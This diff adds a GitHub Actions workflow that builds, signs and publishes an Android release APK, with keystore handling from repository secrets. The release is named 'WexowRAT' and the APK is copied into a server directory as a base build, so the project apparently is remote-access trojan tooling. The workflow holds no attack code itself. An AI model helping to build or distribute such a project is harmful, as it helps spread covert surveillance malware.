@@ -1,0 +1,161 @@
+name: Build Release APK
+
+on:
+  push:
+    tags:
+      - 'v*.*.*'
+  workflow_dispatch:
+    inputs:
+      version_name:
+        description: 'Version name (e.g. 1.2.3)'
+        required: false
+        default: '1.0.0'
+      version_code:
+        description: 'Version code (integer)'
+        required: false
+        default: '1'
+
+# Required repository secrets:
+#   KEYSTORE_BASE64      — base64-encoded .jks keystore (see generate-keystore.yml)
+#   KEYSTORE_PASSWORD    — password for the keystore
+#   KEY_ALIAS            — alias of the signing key inside the keystore
+#   KEY_PASSWORD         — password for the key itself
+
+jobs:
+  build-release:
+    name: Build Signed Release APK
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Resolve version from tag or input
+        id: version
+        run: |
+          if [ "${{ github.event_name }}" = "push" ]; then
+            TAG="${{ github.ref_name }}"
+            NAME="${TAG#v}"
+            CODE=$(echo "$NAME" | awk -F. '{printf "%d%02d%02d", $1, $2, $3}')
+          else
+            NAME="${{ github.event.inputs.version_name }}"
+            CODE="${{ github.event.inputs.version_code }}"
+          fi
+          echo "name=$NAME" >> $GITHUB_OUTPUT
+          echo "code=$CODE" >> $GITHUB_OUTPUT
+          echo "Resolved version: $NAME ($CODE)"
+
+      - name: Set up JDK 11
+        uses: actions/setup-java@v4
+        with:
+          java-version: '11'
+          distribution: 'temurin'
+          cache: 'gradle'
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+        with:
+          log-accepted-android-sdk-licenses: false
+
+      - name: Install required SDK components
+        run: |
+          sdkmanager "build-tools;30.0.3" "platforms;android-34" --sdk_root=$ANDROID_HOME
+
+      - name: Decode keystore
+        run: |
+          echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > client/keystore.jks
+          echo "Keystore decoded successfully"
+
+      - name: Create local.properties
+        working-directory: client
+        run: echo "sdk.dir=$ANDROID_HOME" > local.properties
+
+      - name: Cache Gradle wrapper
+        uses: actions/cache@v4
+        with:
+          path: ~/.gradle/wrapper
+          key: gradle-wrapper-${{ hashFiles('client/gradle/wrapper/gradle-wrapper.properties') }}
+
+      - name: Cache Gradle packages
+        uses: actions/cache@v4
+        with:
+          path: ~/.gradle/caches
+          key: gradle-caches-${{ hashFiles('client/**/*.gradle') }}
+          restore-keys: |
+            gradle-caches-
+
+      - name: Make gradlew executable
+        working-directory: client
+        run: chmod +x gradlew
+
+      - name: Build release APK
+        working-directory: client
+        run: |
+          ./gradlew assembleRelease \
+            --stacktrace \
+            --no-daemon \
+            -PversionName=${{ steps.version.outputs.name }} \
+            -PversionCode=${{ steps.version.outputs.code }}
+        env:
+          KEYSTORE_PATH: ${{ github.workspace }}/client/keystore.jks
+          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
+          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
+          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
+
+      - name: Locate output APK
+        id: apk
+        working-directory: client
+        run: |
+          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "path=$APK" >> $GITHUB_OUTPUT
+          echo "size=$(du -h $APK | awk '{print $1}')" >> $GITHUB_OUTPUT
+          echo "Found APK: $APK"
+
+      - name: Rename APK
+        run: |
+          cp "client/${{ steps.apk.outputs.path }}" \
+             "wexow-release-v${{ steps.version.outputs.name }}.apk"
+
+      - name: Wipe keystore from disk
+        if: always()
+        run: rm -f client/keystore.jks
+
+      - name: Upload release APK artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: wexow-release-v${{ steps.version.outputs.name }}
+          path: wexow-release-v${{ steps.version.outputs.name }}.apk
+          retention-days: 90
+
+      - name: Copy to server directory
+        run: cp "wexow-release-v${{ steps.version.outputs.name }}.apk" server/base.apk
+
+      - name: Upload server base.apk artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: server-base-apk-release-${{ steps.version.outputs.name }}
+          path: server/base.apk
+          retention-days: 90
+
+      - name: Create GitHub Release
+        if: startsWith(github.ref, 'refs/tags/')
+        uses: softprops/action-gh-release@v2
+        with:
+          files: wexow-release-v${{ steps.version.outputs.name }}.apk
+          name: WexowRAT v${{ steps.version.outputs.name }}
+          generate_release_notes: true
+          draft: false
+          prerelease: false
+
+      - name: Build summary
+        run: |
+          echo "## Release Build Summary" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "| Field | Value |" >> $GITHUB_STEP_SUMMARY
+          echo "|-------|-------|" >> $GITHUB_STEP_SUMMARY
+          echo "| Version | \`${{ steps.version.outputs.name }}\` |" >> $GITHUB_STEP_SUMMARY
+          echo "| Version Code | \`${{ steps.version.outputs.code }}\` |" >> $GITHUB_STEP_SUMMARY
+          echo "| APK Size | ${{ steps.apk.outputs.size }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| Signed | ✅ |" >> $GITHUB_STEP_SUMMARY
+          echo "| Build Type | release |" >> $GITHUB_STEP_SUMMARY
+          
